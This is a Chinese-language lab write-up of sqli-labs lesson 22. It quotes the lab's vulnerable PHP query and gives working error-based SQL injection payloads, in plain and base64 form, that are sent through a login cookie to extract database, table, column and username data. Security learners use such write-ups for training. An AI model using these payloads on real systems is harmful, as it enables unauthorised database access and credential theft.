---
title: less22
url: https://www.yuque.com/u29002979/ep2zrx/apfen7iyy03crkry
---

```bash
$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";

$cookee = base64_decode($cookee);
			$cookee1 = '"'. $cookee. '"';
			echo "<br></font>";
			$sql="SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1";
```

与Less21的唯一区别在于此关闭合方式为双引号"

成功登录后发现在Cookie处登录的信息被进行了加密，

> YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
> YOUR IP ADDRESS IS : 192.168.31.119
> DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE
> YOUR COOKIE : uname = YWRtaW4= and expires: Wed 16 Nov 2022 - 20:58:46
> Your Login name:admin
> Your Password:admin
> Your ID:8

<a name="DsPkr"></a>

# 判断字段数

`uname=admin" order by 4-- +`
先将语句进行base64加密，再进行注入，
`uname=YWRtaW4iIG9yZGVyIGJ5IDQtLSAr`

> Issue with your mysql: Unknown column '4' in 'order clause'

<a name="Tcgou"></a>

# 报错注入

```bash
爆破数据库名
uname=admin" union select 1,2,updatexml(1,concat(0x7e,database(),0x7e),1)-- +
uname=YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKS0tICs=
爆破数据表名
uname=admin" union select 1,2,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)-- +
uname=YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYSA9IGRhdGFiYXNlKCkpLDB4N2UpLDEpLS0gKw==
爆破字段名
uname=admin" union select 1,2,updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 8,1),0x7e),1)-- +
uname=YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCAoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnIGxpbWl0IDgsMSksMHg3ZSksMSktLSAr
爆破字段
uname=admin" union select 1,2,updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)-- +
uname=admin" union select 1,2,updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)-- +
```
